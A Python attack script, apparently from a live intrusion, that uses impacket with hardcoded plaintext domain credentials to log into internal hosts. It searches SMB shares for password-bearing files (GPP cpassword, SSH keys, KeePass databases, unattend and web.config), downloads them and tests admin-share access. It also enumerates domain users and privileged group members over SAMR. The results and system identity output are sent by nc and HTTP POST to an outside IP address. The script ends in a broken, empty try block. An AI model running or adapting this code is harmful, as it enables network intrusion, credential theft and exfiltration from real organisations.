#!/usr/bin/env python3
# authenticated enum: shares walk + GPP flags/fetch + SAMR users/groups/admins + admin-share check
import sys, base64, subprocess
sys.path.insert(0, "/tmp/imp")
O = "/tmp/.ADE.txt"
out = open(O, "w", buffering=1)
def w(s):
    try: out.write(str(s) + "\n")
    except Exception: pass

def post(name):
    try:
        b = base64.b64encode(open(O, "rb").read()).decode()
        subprocess.run("printf 'POST /up HTTP/1.0\\r\\nHost: 131.123.43.239\\r\\nX-Name: %s\\r\\nContent-Length: %s\\r\\n\\r\\n%s' | timeout 90 nc 131.123.43.239 80" % (name, len(b), b), shell=True)
    except Exception: pass

HOSTS = ["10.61.10.10","10.61.10.11","10.61.10.12","10.61.10.15","10.61.10.24","10.61.10.119"]
ACCTS = [("3cx","!QAZxsw2"),("a.zhuk","!QAZxsw2")]
FLAGS = ("groups.xml","cpassword",".kdbx","unattend","web.config","passwords","secret",".ppk","id_rsa","scheduledtasks.xml","services.xml","datasources.xml","printers.xml","drives.xml")
FETCH = ("groups.xml","unattend","web.config","scheduledtasks.xml","services.xml","datasources.xml","printers.xml")
fetchcap = [0]

w("ADENUM_START")
post("mel_lat_ades")

from impacket.smbconnection import SMBConnection

def sname(sh):
    nm = sh["shi1_netname"]
    if isinstance(nm, bytes):
        return nm.decode("utf-16-le", "replace").rstrip("\x00")
    return str(nm).rstrip("\x00")

def walk(c, share, path, depth, cap):
    if depth > 4 or cap[0] > 6000:
        return
    try:
        for f in c.listPath(share, path + "*"):
            fn = f.get_longname()
            if fn in (".", ".."):
                continue
            full = path + fn
            low = full.lower()
            if any(k in low for k in FLAGS):
                w("!!! FLAG %s %s" % (share, full))
            if f.is_directory():
                cap[0] += 1
                walk(c, share, full + "\\", depth + 1, cap)
            else:
                if any(k in low for k in FETCH) and f.get_filesize() < 120000 and fetchcap[0] < 2000000:
                    try:
                        import io
                        bio = io.BytesIO()
                        c.getFile(share, full, bio.write)
                        data = bio.getvalue()
                        fetchcap[0] += len(data)
                        w("[FILE] %s %s (%d bytes)" % (share, full, len(data)))
                        w(data.decode("utf-8", "replace")[:60000])
                    except Exception as e:
                        w("[FILE-ERR] %s %s %s" % (share, full, str(e)[:60]))
    except Exception:
        pass

for ip, (u, p) in [(ip, a) for ip in HOSTS for a in ACCTS]:
    cap = [0]
    try:
        c = SMBConnection(ip, ip, timeout=8)
        c.login(u, p, "MLT", "", "")
        w("=== SHARES %s as %s ===" % (ip, u))
        try:
            for sh in c.listShares():
                nm = sname(sh)
                if nm.upper() == "IPC$":
                    continue
                w("[share] " + nm)
                if nm.upper() != "ADMIN$":
                    walk(c, nm, "\\", 0, cap)
        except Exception as e:
            w("listShares err %s" % str(e)[:80])
        for adm in ("ADMIN$", "C$"):
            try:
                c.connectTree(adm)
                w("!!! ADMIN-OK %s %s %s" % (u, ip, adm))
            except Exception:
                pass
        try: c.logoff()
        except Exception: pass
    except Exception as e:
        w("%s %s conn err %s" % (ip, u, str(e)[:80]))

# SAMR enum on DCs
try:
    from impacket.dcerpc.v5 import transport, samr

    def samr_enum(ip):
        u, p = ACCTS[0]
        rpctrans = transport.SMBTransport(ip, 445, r"\samr", username=u, password=p, domain="MLT")
        dce = rpctrans.get_dce_rpc()
        dce.connect(); dce.bind(samr.MSRPC_UUID_SAMR)
        sh = samr.hSamrConnect(dce)['ServerHandle']
        usermap = {}
        doms = samr.hSamrEnumerateDomainsInSamServer(dce, sh)['Buffer']['Buffer']
        for d0 in doms:
            dname = d0['Name']
            sid = samr.hSamrLookupDomainInSamServer(dce, sh, dname)['DomainId']
            dh = samr.hSamrOpenDomain(dce, sh, domainId=sid)['DomainHandle']
            # users
            for filt, tag in ((samr.USER_NORMAL_ACCOUNT, "users"), (0x1030, "comps")):
                try:
                    enumCtx = 0
                    while True:
                        r = samr.hSamrEnumerateUsersInDomain(dce, dh, userAccountControl=filt, enumerationContext=enumCtx, preferedMaximumLength=0xffffffff)
                        for e in r['Buffer']['Buffer']:
                            usermap[int(e['RelativeId'])] = e['Name']
                            w("[%s] %s\\%s rid=%s" % (tag, dname, e['Name'], e['RelativeId']))
                        if r['ErrorCode'] == 0:
                            break
                        enumCtx = r['EnumerationContext']
                except Exception as e:
                    w("enumusers %s %s err %s" % (dname, tag, str(e)[:60]))
            # groups
            try:
                enumCtx = 0
                while True:
                    r = samr.hSamrEnumerateGroupsInDomain(dce, dh, enumerationContext=enumCtx, preferedMaximumLength=0xffffffff)
                    for e in r['Buffer']['Buffer']:
                        gname = e['Name']; grid = e['RelativeId']
                        w("[group] %s\\%s rid=%s" % (dname, gname, grid))
                        if grid in (512, 518, 519, 520, 521, 544, 548, 549, 550, 551, 571):
                            try:
                                gh = samr.hSamrOpenGroup(dce, dh, groupId=grid)['GroupHandle']
                                m = samr.hSamrGetMembersInGroup(dce, gh)
                                rids = []
                                try:
                                    for x in m['Members']['Members']:
                                        rids.append(int(x))
                                except Exception:
                                    pass
                                if rids:
                                    nm = [usermap.get(r, "rid%d" % r) for r in rids]
                                    w("!!! MEMBERS %s\\%s: %s" % (dname, gname, ", ".join(nm)))
                                else:
                                    w("[members] %s empty" % gname)
                                samr.hSamrCloseHandle(dce, gh)
                            except Exception as e:
                                w("members %s err %s" % (gname, str(e)[:60]))
                    if r['ErrorCode'] == 0:
                        break
                    enumCtx = r['EnumerationContext']
            except Exception as e:
                w("enumgroups %s err %s" % (dname, str(e)[:60]))
            # aliases
            try:
                enumCtx = 0
                while True:
                    r = samr.hSamrEnumerateAliasesInDomain(dce, dh, enumerationContext=enumCtx, preferedMaximumLength=0xffffffff)
                    for e in r['Buffer']['Buffer']:
                        aname = e['Name']; arid = e['RelativeId']
                        w("[alias] %s\\%s rid=%s" % (dname, aname, arid))
                        if arid in (544, 548, 549, 550, 551, 555, 571):
                            try:
                                ah = samr.hSamrOpenAlias(dce, dh, aliasId=arid)['AliasHandle']
                                m = samr.hSamrGetMembersInAlias(dce, ah)
                                ms = []
                                for x in m['Members']['Sids']:
                                    try:
                                        s = x['SidPointer'].formatCanonical()
                                        try:
                                            r = int(str(s).rsplit("-",1)[1]); s += "(%s)" % usermap.get(r,"?")
                                        except Exception: pass
                                        ms.append(s)
                                    except Exception: ms.append("?")
                                w("!!! ALIAS-MEMBERS %s\\%s: %s" % (dname, aname, ", ".join(ms) if ms else "empty"))
                                samr.hSamrCloseHandle(dce, ah)
                            except Exception as e:
                                w("aliasmem %s err %s" % (aname, str(e)[:60]))
                    if r['ErrorCode'] == 0:
                        break
                    enumCtx = r['EnumerationContext']
            except Exception as e:
                w("enumalias %s err %s" % (dname, str(e)[:60]))
        dce.disconnect()

    for dc in ("10.61.10.10", "10.61.10.11"):
        try:
            w("=== SAMR %s ===" % dc)
            samr_enum(dc)
        except Exception as e:
            w("samr %s err %s" % (dc, str(e)[:120]))
except Exception as e:
    w("samr import err %s" % str(e)[:120])

out.close()
post("mel_lat_ade")
print("ADE_DONE")

import os,base64,urllib.request as u
try:
 d=base64.b64encode(os.popen("id;hostname;uname -a").read().encode()).decode(); u.urlopen(u.Request("http://131.123.43.239/up",data=d.encode(),headers={"X-Name":"wrk_out"}),timeout=10)
except Exception: pass

try:
except Exception: pass

